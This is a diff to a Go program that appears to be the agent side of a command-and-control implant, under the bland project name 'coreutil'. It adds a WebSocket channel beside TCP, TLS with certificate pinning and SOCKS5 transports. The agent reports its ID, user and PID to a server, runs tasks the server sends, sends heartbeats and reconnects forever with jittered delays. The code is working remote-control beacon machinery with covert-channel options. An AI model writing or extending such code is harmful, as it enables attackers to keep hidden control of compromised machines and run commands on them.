@@ -4,6 +4,7 @@ package main
 import (
 	"bufio"
 	"encoding/base64"
+	"encoding/json"
 	"encoding/binary"
 	"flag"
 	"fmt"
@@ -22,6 +23,7 @@ import (
 
 	"coreutil/internal/proto"
 	"coreutil/internal/tlsx"
+	"coreutil/internal/ws"
 	"crypto/tls"
 )
 
@@ -335,10 +337,104 @@ func dial() (net.Conn, error) {
 	return conn, nil
 }
 
+// msgLink 消息通道抽象：TCP/TLS 用长度前缀帧，WS 用 binary frame（payload=JSON）
+type msgLink interface {
+	Send(*proto.Msg) error
+	Recv() (*proto.Msg, error)
+	Close() error
+}
+
+type tcpLink struct {
+	conn net.Conn
+	r    *bufio.Reader
+}
+
+func (l *tcpLink) Send(m *proto.Msg) error { return proto.WriteMsg(l.conn, m) }
+func (l *tcpLink) Recv() (*proto.Msg, error) {
+	return proto.ReadMsg(l.r)
+}
+func (l *tcpLink) Close() error { return l.conn.Close() }
+
+type wsLink struct {
+	c *ws.Conn
+}
+
+func (l *wsLink) Send(m *proto.Msg) error {
+	b, err := json.Marshal(m)
+	if err != nil {
+		return err
+	}
+	return l.c.WriteFrame(b, true)
+}
+func (l *wsLink) Recv() (*proto.Msg, error) {
+	payload, err := l.c.ReadFrame()
+	if err != nil {
+		return nil, err
+	}
+	var m proto.Msg
+	if err := json.Unmarshal(payload, &m); err != nil {
+		return nil, err
+	}
+	return &m, nil
+}
+func (l *wsLink) Close() error { return l.c.Close() }
+
+// dialLink 按 -c 前缀建立链路：ws:// / wss:// → WebSocket；否则 TCP（可 TLS）
+func dialLink() (msgLink, error) {
+	addr := *serverAddr
+	if strings.HasPrefix(addr, "ws://") || strings.HasPrefix(addr, "wss://") {
+		var tcfg *tls.Config
+		if *tlsEnable {
+			cfg, err := tlsx.ClientConfig(*tlsPin)
+			if err != nil {
+				return nil, err
+			}
+			tcfg = cfg
+		}
+		c, err := ws.Dial(addr, tcfg, "/")
+		if err != nil {
+			return nil, err
+		}
+		return &wsLink{c: c}, nil
+	}
+	conn, err := dialTCP(addr)
+	if err != nil {
+		return nil, err
+	}
+	return &tcpLink{conn: conn, r: bufio.NewReader(conn)}, nil
+}
+
+// dialTCP 原 dial：直连/socks5 + 可选 TLS
+func dialTCP(addr string) (net.Conn, error) {
+	var conn net.Conn
+	var err error
+	if *proxyAddr != "" {
+		conn, err = socks5Dial(*proxyAddr, addr)
+	} else {
+		conn, err = net.DialTimeout("tcp", addr, 10*time.Second)
+	}
+	if err != nil {
+		return nil, err
+	}
+	if *tlsEnable {
+		cfg, cerr := tlsx.ClientConfig(*tlsPin)
+		if cerr != nil {
+			conn.Close()
+			return nil, cerr
+		}
+		tc := tls.Client(conn, cfg)
+		if err := tc.Handshake(); err != nil {
+			conn.Close()
+			return nil, err
+		}
+		return tc, nil
+	}
+	return conn, nil
+}
+
 // handleConn 处理一次连接生命周期
-func handleConn(conn net.Conn) {
-	defer conn.Close()
-	r := bufio.NewReader(conn)
+func handleConn(link msgLink) {
+	defer link.Close()
 	hello := &proto.Msg{
 		Type:     proto.MsgHello,
 		AgentID:  *agentID,
@@ -349,22 +445,22 @@ func handleConn(conn net.Conn) {
 		User:     whoami(),
 		PID:      os.Getpid(),
 	}
-	if err := proto.WriteMsg(conn, hello); err != nil {
+	if err := link.Send(hello); err != nil {
 		return
 	}
 	for {
-		m, err := proto.ReadMsg(r)
+		m, err := link.Recv()
 		if err != nil {
 			return
 		}
 		switch m.Type {
 		case proto.MsgTask:
 			res := runTask(m)
-			if err := proto.WriteMsg(conn, res); err != nil {
+			if err := link.Send(res); err != nil {
 				return
 			}
 		case proto.MsgPing:
-			_ = proto.WriteMsg(conn, &proto.Msg{Type: proto.MsgBeat, AgentID: *agentID})
+			_ = link.Send(&proto.Msg{Type: proto.MsgBeat, AgentID: *agentID})
 		}
 	}
 }
@@ -387,7 +483,7 @@ func main() {
 	}
 	logf("id=%s -> %s%s", *agentID, *serverAddr, via)
 	for {
-		conn, err := dial()
+		link, err := dialLink()
 		if err != nil {
 			s := sleepWithJitter(*reconnect)
 			logf("dial fail: %v (retry %ds)", err, s)
@@ -395,7 +491,7 @@ func main() {
 			continue
 		}
 		logf("up")
-		handleConn(conn)
+		handleConn(link)
 		s := sleepWithJitter(*reconnect)
 		logf("down, retry %ds", s)
 		time.Sleep(time.Duration(s) * time.Second)
